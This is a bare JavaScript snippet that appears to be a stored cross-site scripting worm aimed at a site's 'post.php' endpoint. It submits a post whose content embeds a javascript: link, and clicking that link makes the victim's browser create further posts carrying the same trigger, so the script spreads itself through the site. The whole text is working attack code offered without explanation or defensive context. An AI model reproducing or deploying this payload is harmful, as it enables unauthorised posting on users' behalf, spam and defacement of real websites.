const XHR = new XMLHttpRequest();
const FD  = new FormData();
FD.append('title', 'recursive post');
var a = "<a id=1929 href=\"javascript:const XHR = new XMLHttpRequest();const FD  = new FormData();FD.append('title', 'new post haha');FD.append('content', '<a href=\\'javascript:document.getElementById(1929).click()\\'>7c</a>');FD.append('type', 1);FD.append('form', 'content');XHR.open( 'POST', 'post.php' );XHR.send( FD );\">7c</a>";
FD.append('content', a);
FD.append('type', 1);
FD.append('form', 'content');
XHR.open( 'POST', 'post.php' );
XHR.send( FD );



